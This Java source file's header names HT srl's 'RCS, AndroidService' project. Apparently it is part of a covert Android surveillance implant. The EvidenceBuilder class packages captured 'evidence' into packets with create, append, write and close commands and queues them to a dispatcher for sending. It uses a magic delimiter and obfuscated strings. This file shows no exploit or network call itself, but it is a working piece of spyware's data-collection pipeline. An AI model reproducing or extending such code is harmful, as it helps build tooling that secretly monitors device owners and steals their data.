/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : LogR.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.evidence;

import com.android.dvci.Packet;
import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.dvci.util.DataBuffer;
import com.android.dvci.util.Utils;
import com.android.dvci.util.WChar;
import com.android.mm.M;

import java.io.DataInputStream;
import java.io.IOException;
import java.util.ArrayList;

/**
 * The Class LogR.
 */
public class EvidenceBuilder {
	private static final String TAG = "EvBuilder";
	private static boolean firstInfo = true;

	/**
	 * The type.
	 */
	private int type;

	/**
	 * The unique.
	 */
	private long unique;

	/**
	 * The disp.
	 */
	private EvDispatcher disp;

	private boolean hasData;

	/**
	 * The Constant LOG_CREATE.
	 */
	final public static int LOG_CREATE = 0x1;

	/**
	 * The Constant LOG_ATOMIC.
	 */
	final public static int LOG_ATOMIC = 0x2;

	/**
	 * The Constant LOG_APPEND.
	 */
	final public static int LOG_APPEND = 0x3;

	/**
	 * The Constant LOG_WRITE.
	 */
	final public static int LOG_WRITE = 0x4;

	/**
	 * The Constant LOG_CLOSE.
	 */
	final public static int LOG_CLOSE = 0x5;

	/**
	 * The Constant LOG_ITEMS.
	 */
	final public static int LOG_ITEMS = 0x6;

	public static final int INTERRUPT = -1;

	/**
	 * The EVIDENCE delimiter.
	 */
	public static int E_DELIMITER = 0xABADC0DE;

	/**
	 * Instantiates a new log, creates the evidence.
	 *
	 * @param evidence the log type
	 * @param priority the priority
	 */
	public EvidenceBuilder(final int evidence) {
		final Packet p = init(evidence);
		p.setCommand(LOG_CREATE);

		send(p);
	}

	/**
	 * Instantiates a new log, creates the evidence with additional.
	 *
	 * @param evidenceType the log type
	 * @param priority     the priority
	 * @param additional   the additional
	 */
	public EvidenceBuilder(final int evidenceType, final byte[] additional) {
		final Packet p = init(evidenceType);
		p.setCommand(LOG_CREATE);
		p.setAdditional(additional);

		send(p);
	}

	/**
	 * Instantiates a new log, creates atomically the evidence with additional
	 * and data.
	 *
	 * @param evidenceType the log type
	 * @param priority     the priority
	 * @param additional   the additional
	 * @param data         the data
	 */
	private EvidenceBuilder(final int evidenceType, final byte[] additional, final byte[] data) {
		final Packet p = init(evidenceType);
		p.setCommand(LOG_ATOMIC);
		p.setAdditional(additional);
		p.setData(data);

		hasData = true;
		send(p);
	}

	private Packet init(final int evidence) {
		unique = Utils.getRandom();
		disp = EvDispatcher.self();
		type = evidence;

		final Packet p = new Packet(unique);

		p.setType(type);

		return p;
	}

	public static void atomic(int evidenceType, byte[] additional, byte[] data) {
		if (Cfg.DEBUG) {
			// Check.log(TAG + " (atomic)");
		}
		final Packet p = new Packet(evidenceType, additional, data);
		EvDispatcher.self().send(p);
	}

	public static void atomic(int evidenceType, ArrayList<byte[]> items) {
		if (Cfg.DEBUG) {
			// Check.log(TAG + " (atomic)");
		}
		final Packet p = new Packet(evidenceType, items);
		EvDispatcher.self().send(p);
	}

	// Send data to dispatcher

	/**
	 * Send.
	 *
	 * @param p the p
	 */
	private void send(final Packet p) {
		if (disp == null) {
			disp = EvDispatcher.self();

			if (disp == null) {
				return;
			}
		}

		disp.send(p);
	}

	/**
	 * Write or append data to the log.
	 *
	 * @param data the data
	 */
	public void write(final byte[] data) {
		final Packet p = new Packet(unique);

		p.setCommand(LOG_WRITE);
		p.setData(data);
		send(p);

		hasData = true;
		return;
	}

	public void write(ArrayList<byte[]> bytelist) {
		int totalLen = 0;
		for (final byte[] token : bytelist) {
			totalLen += token.length;
		}

		final int offset = 0;
		final byte[] buffer = new byte[totalLen];
		final DataBuffer databuffer = new DataBuffer(buffer, 0, totalLen);

		for (final byte[] token : bytelist) {
			databuffer.write(token);
		}

		write(buffer);
	}

	public void write(DataInputStream is, int length) {
		int BLOCKSIZE = Cfg.EV_BLOCK_SIZE;
		byte[] buffer = new byte[BLOCKSIZE];
		int offset = 0;

		Packet p = new Packet(unique);

		p.setCommand(LOG_APPEND);
		p.setData(null, length);
		send(p);

		int size = 0;
		try {
			for (; ; ) {
				buffer = new byte[BLOCKSIZE];
				int len = is.read(buffer);
				if (len == -1) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (write) end of file");
					}
					break;
				} else if (len == 0) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (write) len 0");
					}
					continue;
				}
				if (len != BLOCKSIZE) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (write) last block size: %s", len);
					}
					Utils.sleep(100);
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (write) block size: %s %s/%s", len, size, length);
					}
				}
				p = new Packet(unique);
				p.setCommand(LOG_APPEND);
				p.setData(buffer, len);
				send(p);
				hasData = true;
				size += len;

			}

		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (write) Error: " + e);
			}
		}


		if (Cfg.DEBUG) {
			Check.ensures(size == length, "Wrong size, expected:" + length);
			Check.log(TAG + " (write) sent size: %s", size);
		}

	}

	/**
	 * Close.
	 */
	public void close() {
		final Packet p = new Packet(unique);

		p.setCommand(LOG_CLOSE);
		send(p);
		return;
	}

	public void immediateClose() {
		final Packet p = new Packet(unique);

		p.setCommand(LOG_CLOSE);
		send(p);
		// TODO: rendere la send sincrona.
		Utils.sleep(2000);
	}

	public boolean hasData() {
		return hasData;
	}

	/**
	 * Info.
	 *
	 * @param message the message
	 */
	public static void info(final String message) {
		try {
			// atomic info
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + message + " firstinfo: " + firstInfo);//$NON-NLS-1$
			}

			infoStart();
			atomic(EvidenceType.INFO, null, WChar.getBytes(message, true));

		} catch (final Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
			}
		}
	}

	public static void infoStart() {
		try {
			if (firstInfo) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: infoStart, firstinfo: " + firstInfo);//$NON-NLS-1$
				}
				atomic(EvidenceType.INFO, null, WChar.getBytes(M.e("Started"), true));
				firstInfo = false;
			}
		} catch (final Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
			}
		}
	}
}
